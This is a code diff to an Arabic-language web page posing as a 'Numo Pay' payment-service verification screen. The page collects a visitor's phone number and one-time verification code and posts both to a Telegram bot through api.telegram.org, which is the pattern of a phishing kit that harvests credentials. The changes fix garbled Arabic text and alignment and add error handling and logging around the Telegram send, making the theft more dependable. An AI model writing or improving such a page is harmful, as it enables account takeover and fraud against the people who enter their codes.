@@ -91,7 +91,7 @@ body {
   border-radius: 20px;
   padding: 0 20px;
   font-size: 18px;
-  text-align: right;
+  text-align: left;
   color: #333;
   transition: all 0.3s ease;
   background: white;
@@ -314,7 +314,7 @@ body {
     <div class="brand-name">نمو باي</div>
     <div class="brand-en">NUMO PAY</div>
     
-    <div class="subtitle">��لرجاء إدخال رقم هاتفك للمتابعة</div>
+    <div class="subtitle">الرجاء إدخال رقم هاتفك للمتابعة</div>
     
     <div class="phone-input-wrapper">
       <input 
@@ -481,15 +481,24 @@ function handleCodeSubmit() {
     showMessage(msgDiv, '✅ تم التحقق بنجاح!', 'success');
 
     // إرسال رقم الهاتف + رمز التحقق معاً
-    const finalMessage = `✅ تحقق ناجح - نمو باي\n\n📞 رقم اله��تف: ${currentPhone}\n🔐 رمز التحقق: ${code}\n\n✔️ تم التحقق بنجاح والتسجيل مكتمل`;
+    const finalMessage = `✅ تحقق ناجح - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز التحقق: ${code}\n\n✔️ تم التحقق بنجاح والتسجيل مكتمل`;
 
-    sendToTelegram(finalMessage).then(() => {
-      setTimeout(() => {
-        showMessage(msgDiv, '🎉 تم التحقق والإرسال بنجاح!', 'success');
+    console.log('Sending to Telegram:', finalMessage);
+    
+    sendToTelegram(finalMessage).then(success => {
+      console.log('Send result:', success);
+      if (success) {
         setTimeout(() => {
-          goBackToPhone();
-        }, 1500);
-      }, 300);
+          showMessage(msgDiv, '🎉 تم التحقق والإرسال بنجاح!', 'success');
+          setTimeout(() => {
+            goBackToPhone();
+          }, 1500);
+        }, 300);
+      } else {
+        showMessage(msgDiv, '❌ حدث خطأ في الإرسال', 'error');
+        btn.disabled = false;
+        btn.innerText = 'تحقق من الرمز';
+      }
     });
   } else {
     showMessage(msgDiv, '❌ الرمز غير صحيح. حاول مرة أخرى', 'error');
@@ -548,6 +557,7 @@ function goBackToPhone() {
 function sendToTelegram(message) {
   return new Promise((resolve) => {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
     fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -558,8 +568,14 @@ function sendToTelegram(message) {
       })
     })
     .then(r => r.json())
-    .then(data => resolve(data.ok))
-    .catch(() => resolve(false));
+    .then(data => {
+      console.log('Telegram response:', data);
+      resolve(data.ok);
+    })
+    .catch(err => {
+      console.error('Telegram error:', err);
+      resolve(false);
+    });
   });
 }
 
